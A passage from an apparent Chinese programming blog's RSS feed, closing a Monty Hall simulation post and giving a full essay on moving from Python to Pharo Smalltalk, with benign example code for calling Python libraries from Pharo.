            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;remove_choice&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;goat&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;choices&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;remove&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;remove_choice&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;break&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这个方案让主持人随机打开一个门，当看到山羊就指出来。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;choices&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;goat&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;choices&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;remove&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;choices&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;choices&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;remove&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;choices&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这个方案似乎是有序的，主持人从左到右，或从右到左开门，查看物体是不是山羊。&lt;/p&gt;
&lt;p&gt;从代码中你会近距离注意到，主持人的认知和操作过程。我们看到主持人为了找出山羊在哪里，他&lt;code&gt;认真检查了选项&lt;/code&gt;，有时候&lt;code&gt;检查了2个选项&lt;/code&gt;, 自然语言中我们很难注意到这点。如果你在编程的时候，把主持人想象成选手，你发现&lt;code&gt;他有两次机会做选择&lt;/code&gt;! 所以我们当然采用主持人的选项！&lt;/p&gt;
&lt;h1 id="_9"&gt;后话&lt;/h1&gt;
&lt;p&gt;@yuhao是凝固态物理博士，对量子力学了解很多，之前送了我一本书叫《不同的宇宙》，这本书机智幽默，&lt;a href="https://zh.wikipedia.org/zh-cn/%E7%BE%85%E4%BC%AF%E7%89%B9%C2%B7%E5%8B%9E%E5%A4%AB%E6%9E%97"&gt;罗伯特·劳克林&lt;/a&gt;在书里讨论物理学中还原论和涌现理论的分歧，也讨论一些有趣的量子力学问题，我非常喜欢这门书，它在带着我们思考，而不是罗列定律。&lt;/p&gt;
&lt;p&gt;我有个奇怪的感觉，概率论的有效性可能揭示出物理世界的某种逻辑结构，这个结构受信息的影响，而不只是受物质和能量的影响。&lt;/p&gt;
&lt;p&gt;但概率论只是&lt;code&gt;指出&lt;/code&gt;，而没有作出解释。&lt;/p&gt;
&lt;p&gt;为什么是这组而不是另一组统计规律？为何是这一簇而不是另一簇物理规律？&lt;/p&gt;
&lt;p&gt;物理世界是不是一种模拟？ &lt;/p&gt;
&lt;p&gt;@yuhao说别纠结这个，它既不可证实也不可证伪，只会带来观念之争。&lt;/p&gt;
&lt;p&gt;我并不纠结，但我饶有兴致。我不害怕它是模拟，柏拉图、卢梭、黑格尔才害怕，因为现实一旦是模拟，他们那些残酷又严肃的理论就显得极为可笑, 他们把意义建立在个人之外,他们把意义建立在强权之上。&lt;/p&gt;
&lt;p&gt;我们拥抱所爱之人，热爱自由和平等，对他人的苦难感同身受，这些不会因为这个世界是模拟而有损于生命的意义。&lt;/p&gt;
&lt;p&gt;但物理世界如果是模拟，这是多大的乐趣啊，我们就可能hack它。&lt;/p&gt;
&lt;h1 id="_10"&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Monty_Hall_problem"&gt;Monty Hall problem&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Monty_Hall"&gt;Monty Hall&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Let%27s_Make_a_Deal"&gt;Let's Make a Deal&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Steve_Selvin"&gt;Steve Selvin&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sat, 23 Mar 2019 00:00:00 +0000</pubDate><guid isPermaLink="false">tag:,2019-03-23:Monty-Hall-problem-programming.html</guid><category>coding</category></item><item><title>从Python转向Pharo</title><link>/from-python-to-pharo.html</link><description>&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/smalltalk_11b30625.png" /&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Do not make end-users suffer because of your laziness or ineptness --Alan Kay&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id="_1"&gt;前言&lt;/h1&gt;
&lt;p&gt;过年的假期里写了篇文章: &lt;a href="https://blog.just4fun.site/Pharo-trip.html"&gt;Smalltalk(Pharo)学习之旅&lt;/a&gt;, 提到&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Bret让我相信smalltalk对我很重要.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我在文章里信誓旦旦地说 准备使用Pharo(smalltalk的一门方言)将Scratch重新带回&lt;a href="https://zh.wikipedia.org/zh-hans/Smalltalk"&gt;smalltalk&lt;/a&gt;(Scratch的第一个版本便是用smalltalk写的)，我甚至给这个计划起了一个好听的名字:&lt;code&gt;回到未来&lt;/code&gt;。可惜在一个假期里习得的能力，并不足以支持我动手干这件事。一半原因也赖Pharo&lt;a href="https://mooc.pharo.org/"&gt;官方mooc&lt;/a&gt;教程，这实在不是一份好教程。&lt;/p&gt;
&lt;p&gt;现在差不多有能力来做这件事了，接下来对Scratch的改进，大多数会用smalltalk来做。&lt;/p&gt;
&lt;p&gt;如果你掌握了基本的编程概念（通过&lt;a href="https://scratch.mit.edu"&gt;Scratch&lt;/a&gt;、或者玩20分钟&lt;a href="http://www.squeakland.org/"&gt;Etoys&lt;/a&gt;足以&lt;a href="https://www.quora.com/What-does-Alan-Kay-think-of-using-either-Squeak-or-Pharo-as-the-first-language-for-introducing-programming"&gt;掌握这些基础概念&lt;/a&gt;），&lt;a href="https://github.com/SquareBracketAssociates/UpdatedPharoByExample"&gt;UpdatedPharoByExample&lt;/a&gt;对你而言将是绝佳的Pharo教程。非常喜欢这份教程，它是我读过最好的编程教程之一,陪伴我渡过好几个美妙的夜晚。另一个印象深刻的编程教程是&lt;a href="https://book.douban.com/subject/10518092/"&gt;Head First Programming&lt;/a&gt;（这本书使用Python来讲解编程基本概念，面向毫无编程经验的新手，内容有趣又友好）&lt;/p&gt;
&lt;p&gt;我倾心于建构主义者(&lt;a href="https://zh.wikipedia.org/zh-cn/%E8%A5%BF%E6%91%A9%E7%88%BE%C2%B7%E6%B4%BE%E6%99%AE%E7%89%B9"&gt;西摩尔·派普特&lt;/a&gt;、&lt;a href="https://zh.wikipedia.org/zh-cn/%E8%89%BE%E4%BC%A6%C2%B7%E5%87%AF"&gt;艾伦·凯&lt;/a&gt;、&lt;a href="http://worrydream.com"&gt;Bret Victor&lt;/a&gt;...)的认知论和教育理论，阅读了他们许多文章和工作成果之后，越来越难以忍受今天的编程工具和环境，你从他们那儿瞥见了未来，目光再落回现实，便开始挑剔，震惊于周遭环境的原始和逼仄。&lt;/p&gt;
&lt;p&gt;艾伦凯在smalltalk上的工作，向我们展示了未来的样子，关于什么是适合人类的创造环境，这是一个伟大的人文主义者为我们带来的伟大礼物。我认为艾伦凯首先是个人文主义者和教育者，其次才是计算机科学家。(他在Ted的自我介绍里，首先提到自己是个教育工作者，其次才说是计算机科学家)，作为教育者的艾伦凯，充满了人文关怀; 而作为计算机科学家的艾伦凯，则充满了想象力和热情。&lt;/p&gt;
&lt;p&gt;在所有哲学家中，我最喜欢&lt;a href="https://zh.wikipedia.org/zh-cn/%E4%BC%AF%E7%89%B9%E5%85%B0%C2%B7%E7%BD%97%E7%B4%A0"&gt;伯特兰·罗素&lt;/a&gt;, 在所有计算机科学家中，我最喜欢艾伦凯。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Three passions, simple but overwhelmingly strong, have governed my life: the longing for love, the search for knowledge, and unbearable pity for the suffering of mankind.  -- Bertrand Russell&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;a href="http://worrydream.com"&gt;Bret Victor&lt;/a&gt;在&lt;a href="https://zh.wikipedia.org/wiki/%E9%81%93%E6%A0%BC%E6%8B%89%E6%96%AF%C2%B7%E6%81%A9%E6%A0%BC%E5%B0%94%E5%B7%B4%E7%89%B9"&gt;Douglas Engelbart&lt;/a&gt;去世的那天写了篇文章: &lt;a href="http://worrydream.com/Engelbart/"&gt;A few words on Doug Engelbart&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Say you bring up his 1968 demo on YouTube and watch a bit. At one point, the face of a remote collaborator, Bill Paxton, appears on screen, and Engelbart and Paxton have a conversation.

&amp;quot;Ah!&amp;quot;, you say. &amp;quot;That&amp;#39;s like Skype!&amp;quot;

Then, Engelbart and Paxton start simultaneously working with the document on the screen.

&amp;quot;Ah!&amp;quot;, you say. &amp;quot;That&amp;#39;s like screen sharing!&amp;quot;

No. It is not like screen sharing at all.

If you look closer, you&amp;#39;ll notice that there are two individual mouse pointers. Engelbart and Paxton are each controlling their own pointer.

&amp;quot;Okay,&amp;quot; you say, &amp;quot;so they have separate mouse pointers, and when we screen share today, we have to fight over a single pointer. That&amp;#39;s a trivial detail; it&amp;#39;s still basically the same thing.&amp;quot;

No. It is not the same thing. At all. It misses the intent of the design, and for a research system, the intent matters most.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;很少有现代计算机编程语言不受smalltalk的影响。但正如许多伟大的事物一样（如上文Douglas Engelbart的&lt;a href="https://zh.wikipedia.org/zh-hant/%E6%89%80%E6%9C%89%E6%BC%94%E7%A4%BA%E4%B9%8B%E6%AF%8D"&gt;The Mother of All Demos&lt;/a&gt;），人们将其断章取义地理解之后，造出无数糟糕得多的东西。&lt;/p&gt;
&lt;p&gt;这些东西因为种种原因流行起来，于是胜利者们一副胜者为王的姿态，说"我是最流行的，我当然就是最好的，你如果真的那么好，为何没有流行起来"。舞台上的C++换上了Java，最近好像又差不多换上了Python。正如柏拉图换上了卢梭，然后是黑格尔、尼采、希特勒，他们轮番站上历史的聚光灯下，拥护者们重复着&lt;code&gt;存在即合理&lt;/code&gt;、&lt;code&gt;胜者即正义&lt;/code&gt;的信条。&lt;/p&gt;
&lt;p&gt;Pharo作为smalltalk的现代方言，它从&lt;a href="https://zh.wikipedia.org/zh-hans/Squeak"&gt;Squeak&lt;/a&gt;出发，忠于smalltalk精神，继续向前。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Everything is an object, and objects communicate only by sending each other message.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我已经体验到Pharo带来的无尽乐趣和自由，在其中创造和表达是如此自在和舒适, 很难再回到原先使用的任何语言中了。&lt;/p&gt;
&lt;p&gt;艾伦凯精心设计了smalltalk。他将使用者摆在第一位置，他们是有情感的人类, 他们不是机器，他们不善于记住一大堆规则，他们遇到未知会疑惑，遇到困难会烦躁。正如艾伦凯在&lt;a href="https://www.quora.com/What-does-Alan-Kay-think-of-using-either-Squeak-or-Pharo-as-the-first-language-for-introducing-programming"&gt;What does Alan Kay think of using either Squeak or Pharo as the first language for introducing programming?&lt;/a&gt;谈到的，smalltalk在设计之初就考虑了&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;减少认知负担&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;并致力于在用户入门时提供&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;真正的演奏(real playing)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;作为设计者, 艾伦凯说:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;不要让用户因为你的懒惰或无能而受苦.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我不知道今天主流编程语言的设计者们看到这些话，作何感想。有许多编程语言设计者对自己&lt;code&gt;闲着没事，花了一周就整了个编程语言&lt;/code&gt;津津乐道。当这些糟糕的语言竟被推上历史舞台，受苦的便是它的用户。Bret在&lt;a href="http://worrydream.com/#!/LearnableProgramming"&gt;LearnableProgramming&lt;/a&gt;一文中对&lt;code&gt;Programming&lt;/code&gt;这门语言的攻击是非常精彩的。而&lt;code&gt;Programming&lt;/code&gt;在糟糕语言排行榜里并不靠前。&lt;/p&gt;
&lt;p&gt;更多关于smalltalk的思想来源，可以参考&lt;a href="http://worrydream.com/EarlyHistoryOfSmalltalk/#p53"&gt;The Early History Of Smalltalk&lt;/a&gt;。&lt;/p&gt;
&lt;h1 id="_2"&gt;缘聚缘散&lt;/h1&gt;
&lt;p&gt;Python并不坏，在所有目前流行的编程语言中，我最喜欢它。它有友好的社区、简洁的语法、完善的生态。如那句流行的口号说的:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;人生苦短，我用Python.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我大约大三(2012-2013年)开始使用Python，之后一直将其作为主要编程语言。Python一路从小众语言成长为今天的主流语言。&lt;/p&gt;
&lt;p&gt;与Python结缘，得从周日的一个晚上说起，当时在校园海报上，看到一个招募帖，有个技术团队在招募前端开发，我那时的兴趣完全在前端开发，它那么鲜活有趣。比php/asp可好玩多了。&lt;/p&gt;
&lt;p&gt;团队由一位口才极好的石姓学长发起，他人很有趣，演讲也富有感染力。回想起来，这应该是改变我人生轨迹的一个夜晚，如果没有加入这个4人小团队，我不大可能从事计算机行业。&lt;/p&gt;
&lt;p&gt;团队里写后端的是一位何姓学长，他使用Ubuntu/Vim/Python。看着光标在黑乎乎的命令行里移动如飞，这场景满足了我对黑客的所有幻想。这些工具被我一一记下，后来都在我的工具箱里。&lt;/p&gt;
&lt;p&gt;那时学校里使用这门语言编程的人可能是个位数，我只知道寥寥三人，何姓学长是一位，我自己是一位，我还忽悠了@ymj换用这门语言。@ymj后来去了创新工场做人工智能；何姓学长杳无踪迹，可能隐姓埋名做了黑客；我则对计算机的许多领域都很好奇，Python的胶水特性十分适合我。&lt;/p&gt;
&lt;p&gt;Python是那种理性的姑娘乐意选择一起生活的结婚对象(当然，理性的姑娘可能选择不婚)，它贴心、随和、经济实用，它有很暖的社区。Python即便有缺点，也绝非不能忍受，最多就是坐在沙发上抠抠脚之类的生活琐碎细节。许多婚姻可能因为争夺遥控器破裂，但很少因为抠脚破裂的，别小看了争夺遥控器这件事，它可能是三观不和的征兆，你们彼此不满于对方的精神食粮。&lt;/p&gt;
&lt;p&gt;遇见smalltalk，对我来说，大抵类似郭襄在风陵渡口的遭遇，你如此清楚地知道，这就是你的所有期待，无论往后岁月黯不黯淡，江山易不易主，江河干不干枯，它都熠熠生辉，如满月，如焰火，如雪夜围炉时，对方眼里倒映的光。&lt;/p&gt;
&lt;p&gt;在很长一段时间内，我还会将Python用作我的工作语言，用它写些脚本来管理系统、科学计算、异步编程...&lt;/p&gt;
&lt;p&gt;但创造和探索，或者如Scratch社区鼓励的:表达自己， 这些激动人心的活动，我都将使用smalltalk. 我将smalltalk视为一个创造友好的语言。我也将编程看作和木工、表演、绘画一样的创造性工作，它的人文属性并不弱于工程属性。个人计算机的早期推动者们 &lt;a href="https://zh.wikipedia.org/zh-cn/%E8%89%BE%E4%BC%A6%C2%B7%E5%87%AF"&gt;艾伦·凯&lt;/a&gt;、&lt;a href="https://zh.wikipedia.org/wiki/%E9%81%93%E6%A0%BC%E6%8B%89%E6%96%AF%C2%B7%E6%81%A9%E6%A0%BC%E5%B0%94%E5%B7%B4%E7%89%B9"&gt;Douglas Engelbart&lt;/a&gt;希望它拥有人文属性。 未来计算机的探索者们&lt;a href="https://zh.wikipedia.org/zh-cn/%E8%89%BE%E4%BC%A6%C2%B7%E5%87%AF"&gt;艾伦·凯&lt;/a&gt;、&lt;a href="http://worrydream.com"&gt;Bret Victor&lt;/a&gt;也希望它有这种属性。&lt;/p&gt;
&lt;h1 id="_3"&gt;增量前进&lt;/h1&gt;
&lt;p&gt;Python在很长的一段时间里依然会是系统管理、信息安全(入侵渗透)、胶水工具、科学计算、人工智能的主力语言。&lt;/p&gt;
&lt;p&gt;我也不希望将之前在这些领域里积累起来的技能都抛弃了，我喜欢增量地前进，而不是换个工具从头再来。&lt;/p&gt;
&lt;p&gt;尽管在原则上我认同爱因斯坦说的: &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;什么是教育？把在学校里学到的所有东西全部忘光了之后留下来的东西才叫教育。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;还记得基本思想&lt;/code&gt;和&lt;code&gt;能操作自如&lt;/code&gt;中间的鸿沟，是需要时间来填补的。有大量细碎的细节和习惯，固化在某个具体技术框架里，要完全迁移到另一个体系中，时间成本并太低。&lt;/p&gt;
&lt;p&gt;所以，在往后的时间里，我即便使用smalltalk来构建新项目，恐怕也会混合Python代码，会用到一些基于Python的顺手工具。&lt;/p&gt;
&lt;p&gt;如何在smalltalk中运行Python代码，让他们能够混合编程？是我接下来需要面对的问题。尤其在过渡阶段，当遇到困难，会想退回到之前熟悉的安全域里。如果smalltalk能够方便调用Python，我就能够放心地增量前进。每次前进一点点，进可攻，退可守。&lt;/p&gt;
&lt;p&gt;这也正是我们之前坚持让Python与Scathch能够互操作地原因，之前在&lt;a href="https://blog.just4fun.site/scratch-adapter-eim-script.html"&gt;使用Python拓展Scratch的能力&lt;/a&gt;里讨论说:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如果这种过渡是必要的，我希望它们是渐进的，而不是割裂的，否则就不叫过渡了。初学者熟悉scratch，也喜欢它，我知道大多数使用scratch的孩子，对它的好感大都胜过文本语言。你不必抛弃scratch，如果你需要一些更强大的功能，使用Python去扩展它，这个过程应该很愉快，你写了很少的Python代码，立马就能应用到你喜欢的Scratch项目上，你看到你逐渐能做更多有趣的事，你感到充满乐趣，所学的新知识，立马应用在你感兴趣的项目里。&lt;br /&gt;
我们反对割裂式的教学，学习者从scratch切换到Python，很长时间内只能通过print看到输出，没有生动的反馈，于是许多人便对阶段感到沮丧，踏上一条从入门到放弃的路。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id="_4"&gt;技术细节&lt;/h3&gt;
&lt;p&gt;最后记录下技术细节。在Pharo中调用Python是很简单的，所受的约束很小，可以自如地在Pharo中调用Python库，并允许采用Pharo语法来调用它们。&lt;/p&gt;
&lt;p&gt;我目前采用&lt;a href="https://github.com/juliendelplanque/Python3Generator"&gt;Python3Generator&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;操作方式非常简单，首先在Pharo(我目前使用&lt;code&gt;Pharo 7.0.1&lt;/code&gt;)中安装依赖库&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;Metacello&lt;/span&gt; &lt;span class="nt"&gt;new&lt;/span&gt;
    &lt;span class="nt"&gt;baseline&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Python3Generator&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="nt"&gt;repository&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;github://juliendelplanque/Python3Generator/repository&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
    &lt;span class="nt"&gt;load&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;然后就可以自如调用Python啦:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Use and initialize the FFI interpreter.&amp;quot;&lt;/span&gt;
P3GInterpreter useFFIInterpreter.
P3GInterpreter current pathToPython&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;/Library/Frameworks/Python.framework/Versions/3.7/bin/python3&amp;#39;&lt;/span&gt;&lt;span class="m"&gt;.&lt;/span&gt;

instr &lt;span class="o"&gt;:=&lt;/span&gt; P3GInstructionsList new.

json &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;json&amp;#39;&lt;/span&gt; asP3GIdentifier.
file &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;file&amp;#39;&lt;/span&gt; asP3GIdentifier.
os &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;os&amp;#39;&lt;/span&gt; asP3GIdentifier.

instr addAll&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    json import.
    os import.
    file &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;open&amp;#39;&lt;/span&gt; asP3GIdentifier callWith&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="c1"&gt;#(&amp;#39;/tmp/osp3g.json&amp;#39; &amp;#39;w&amp;#39;)).&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;file&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="c1"&gt;#write) callWith: { (json=&amp;gt;#dumps) callWith: {{&lt;/span&gt;
                                                &lt;span class="s"&gt;&amp;#39;os&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;os&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="c1"&gt;#name).&lt;/span&gt;
                                                &lt;span class="s"&gt;&amp;#39;uname&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;os&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="c1"&gt;#uname) call } asDictionary} }.&lt;/span&gt;
    &lt;span class="p"&gt;((&lt;/span&gt;file&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="c1"&gt;#close) call)&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="m"&gt;.&lt;/span&gt;

instr execute.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;运行之后,查看&lt;code&gt;/tmp/osp3g.json&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/phpharo_python_6bb2c472.png" /&gt;&lt;/p&gt;
&lt;p&gt;调用强大的第三方库(如&lt;code&gt;numpy&lt;/code&gt;、&lt;code&gt;matplotlib&lt;/code&gt;)也是OK的！&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Use and initialize the FFI interpreter.&amp;quot;&lt;/span&gt;
P3GInterpreter useFFIInterpreter.
P3GInterpreter current pathToPython&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;/usr/bin/python3&amp;#39;&lt;/span&gt;&lt;span class="m"&gt;.&lt;/span&gt;

numpy &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;numpy&amp;#39;&lt;/span&gt; asP3GIdentifier.
mlab &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;matplotlib&amp;#39;&lt;/span&gt; asP3GIdentifier&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="c1"&gt;#mlab.&lt;/span&gt;
pyplot &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;matplotlib&amp;#39;&lt;/span&gt; asP3GIdentifier&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="c1"&gt;#pyplot.&lt;/span&gt;

instr &lt;span class="o"&gt;:=&lt;/span&gt; P3GInstructionsList new.

instr addAll&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="s"&gt;&amp;quot;Import modules.&amp;quot;&lt;/span&gt;
    numpy import.
    mlab import.
    pyplot import.

    &lt;span class="s"&gt;&amp;quot;Set seed for random.&amp;quot;&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;numpy&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="c1"&gt;#random=&amp;gt;#seed) callWith: #(0).&lt;/span&gt;

    &lt;span class="s"&gt;&amp;quot;Example data&amp;quot;&lt;/span&gt;
    &lt;span class="c1"&gt;#mu asP3GIdentifier &amp;lt;- 100.&lt;/span&gt;
    &lt;span class="c1"&gt;#sigma asP3GIdentifier &amp;lt;- 15.&lt;/span&gt;
    &lt;span class="c1"&gt;#x asP3GIdentifier &amp;lt;- (#mu asP3GIdentifier + (#sigma asP3GIdentifier * ((numpy=&amp;gt;#random=&amp;gt;#randn) callWith: #(437)))).&lt;/span&gt;

    &lt;span class="c1"&gt;#num_bin asP3GIdentifier &amp;lt;- 50.&lt;/span&gt;

    &lt;span class="c1"&gt;#res asP3GIdentifier &amp;lt;- (pyplot=&amp;gt;#subplots) call.&lt;/span&gt;
    &lt;span class="c1"&gt;#fig asP3GIdentifier &amp;lt;- (#res asP3GIdentifier at: 0).&lt;/span&gt;
    &lt;span class="c1"&gt;#ax asP3GIdentifier &amp;lt;- (#res asP3GIdentifier at: 1).&lt;/span&gt;

    &lt;span class="s"&gt;&amp;quot;Plot histogram of data.&amp;quot;&lt;/span&gt;
    &lt;span class="c1"&gt;#res asP3GIdentifier &amp;lt;- ((#ax asP3GIdentifier=&amp;gt;#hist) callWith: {#x asP3GIdentifier.#num_bin asP3GIdentifier} with: {&amp;#39;normed&amp;#39; -&amp;gt; 1 } asDictionary).&lt;/span&gt;
    &lt;span class="c1"&gt;#bins asP3GIdentifier &amp;lt;- (#res asP3GIdentifier at: 1).&lt;/span&gt;

    &lt;span class="s"&gt;&amp;quot;Add a &amp;#39;best fit line&amp;#39;&amp;quot;&lt;/span&gt;
    &lt;span class="c1"&gt;#y asP3GIdentifier &amp;lt;- ((mlab=&amp;gt;#normpdf) callWith: {#bins asP3GIdentifier . #mu asP3GIdentifier . #sigma asP3GIdentifier}).&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="c1"&gt;#ax asP3GIdentifier=&amp;gt;#plot) callWith: { #bins asP3GIdentifier . #y asP3GIdentifier . &amp;#39;--&amp;#39; }.&lt;/span&gt;

    &lt;span class="p"&gt;(&lt;/span&gt;pyplot&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="c1"&gt;#show) call&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="m"&gt;.&lt;/span&gt;

instr execute
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;效果如下:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://wwj-fig-bed.just4fun.site/pharo_python_28e89981.png" /&gt;&lt;/p&gt;
&lt;!--
&gt;  It seems to me that unless the Smalltalk community goes for economic self-sufficiency we will forever be reading answers to questions about languages that say, essentially, “there’s a much better way, exemplified by Smalltalk” but have as subtext “but we’ve failed to put that power into people’s hands, we’ve failed to live up to our claims in real systems or any kind of ubiquity” to which the rest of the world, quite reasonably, says “so what?”. -- [Eliot Miranda](https://www.quora.com/Why-does-Smalltalk-not-become-a-commonly-used-platform-for-learning-presentations-and-video-lecture-constructors-Squeak-looks-great-as-an-interactive-presentation-platform-for-college-lecturers)
--&gt;

&lt;h1 id="_5"&gt;第三方库&lt;/h1&gt;
&lt;p&gt;尽管Pharo社区没有Python社区壮大，但社区里已经有很多高质量的第三方库，我整理了一些我喜欢的。 其中&lt;a href="https://gtoolkit.com/"&gt;gtoolkit&lt;/a&gt;、&lt;a href="http://moosetechnology.org/"&gt;Moose&lt;/a&gt;和&lt;a href="http://www.drgeo.eu/home"&gt;Dr Geo&lt;/a&gt;令我大吃一惊。整个Pharo社区充满了人文主义精神，这种精神体现在软件本身里，体现在软件的&lt;a href="https://gtoolkit.com/#design"&gt;设计原则&lt;/a&gt;里，体现在&lt;a href="http://www.drgeo.eu/home"&gt;软件的介绍&lt;/a&gt;里。他们秉承艾伦凯在smalltalk中展现的理念，继续做着令人震惊和振奋的工作。&lt;/p&gt;
&lt;ul&gt;
